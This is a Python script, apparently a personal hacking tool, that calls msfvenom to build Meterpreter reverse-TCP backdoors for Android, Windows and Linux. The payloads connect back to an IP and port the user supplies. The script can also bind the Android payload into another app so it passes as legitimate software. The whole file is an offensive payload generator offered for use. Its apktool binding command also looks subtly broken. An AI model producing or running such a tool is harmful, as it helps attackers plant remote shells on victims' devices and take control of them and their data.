import os
import platform
import logging
import subprocess
import threading
from tkinter import Tk, filedialog
from pyfiglet import Figlet
import sys
import time

# Create a custom Figlet font
custom_figlet = Figlet(font="slant")

# Display 'Pranshu' using the custom font
print(custom_figlet.renderText("Pranshu"))

# Set up the logging system
logging.basicConfig(filename="payload_generator.log", level=logging.INFO, format="%(asctime)s - %(levelname)s: %(message)s")
log = logging.getLogger("payload_generator")

# Function to get the path to the file you want to bind
def get_bind_file_path():
    if platform.system() == "Windows":
        root = Tk()
        root.withdraw()
        file_path = filedialog.askopenfilename()
        root.destroy()
    else:
        file_path = input("Enter the path to the file you want to bind: ")
    return file_path

# Function to create the "Payloads" folder if it doesn't exist
def create_payloads_folder():
    if not os.path.exists("Payloads"):
        os.makedirs("Payloads")

# Function to execute a command and capture the output
def execute_command(command, verbose=False):
    try:
        if verbose:
            print(f"Executing command: {command}")
        result = subprocess.run(command, shell=True, text=True, capture_output=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        error_message = f"Error executing command: {e.stderr}"
        log.error(error_message)
        return error_message

# Function to generate payloads with "Please Wait" animation
def generate_payload_with_animation(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, verbose=False):
    animation_thread = None

    # Define the animation characters
    animation_chars = "|/-\\"

    # Function to display animation
    def display_animation():
        i = 0
        while not done:
            sys.stdout.write("\rPlease Wait... " + animation_chars[i])
            sys.stdout.flush()
            time.sleep(0.1)
            i = (i + 1) % 4

    try:
        done = False
        if verbose:
            animation_thread = threading.Thread(target=display_animation)
            animation_thread.start()

        if not ip or not port:
            raise ValueError("IP address and port are required.")

        if payload_type not in ["android", "windows", "linux"]:
            raise ValueError("Unsupported payload type.")

        if payload_type == "android":
            if not android_api_level:
                raise ValueError("Android API level is required for Android payloads.")

            output_file = f"Payloads/payload.apk"
            payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} --platform android -a dalvik"

        elif payload_type == "windows":
            output_file = f"Payloads/payload.exe"
            payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"

        elif payload_type == "linux":
            output_file = f"Payloads/payload.elf"
            payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"

        create_payloads_folder()

        if bind:
            if not bind_file:
                bind_file = get_bind_file_path()

            if payload_type == "android":
                output_file = f"Payloads/bind_payload.apk"
                binding_command = f"apktool b {output_file} -o {output_file} -f {bind_file}"
                bind_output = execute_command(binding_command, verbose)
                if "Exception" in bind_output:
                    raise Exception(f"Binding failed: {bind_output}")
            else:
                raise ValueError("Binding is not supported for non-Android payloads.")

        payload_output = execute_command(payload_command, verbose)
        if "Exception" in payload_output:
            raise Exception(f"Payload generation failed: {payload_output}")

        done = True
        if verbose:
            print("\n")
        success_message = f"{payload_type.capitalize()} payload generated successfully as '{output_file}'{' (and bound)' if bind else ''}"
        log.info(success_message)
        return success_message
    except Exception as e:
        done = True
        if verbose:
            print("\n")
        log.error(str(e))
        return str(e)

if __name__ == "__main__":
    verbose = False  # Set this to False to suppress the animation and command execution messages

    ip = input("Enter your IP address: ")
    port = input("Enter the port: ")

    print("Select payload type:")
    print("1. Android")
    print("2. Windows")
    print("3. Linux")
    choice = input("Enter the number of your choice: ")

    if choice == "1":
        payload_type = "android"
    elif choice == "2":
        payload_type = "windows"
    elif choice == "3":
        payload_type = "linux"
    else:
        print("Invalid choice. Please choose a valid payload type.")
        exit()

    android_api_level = input("Enter Android API level (e.g., 33 for Android 13, or leave empty for other platforms): ")

    bind = input("Do you want to bind payloads? (yes or no): ").strip().lower() == "yes"
    bind_file = input("Enter the path to the file you want to bind (leave empty if not binding): ").strip()

    result = generate_payload_with_animation(ip, port, payload_type, android_api_level, bind, bind_file, verbose=verbose)
    print(result)
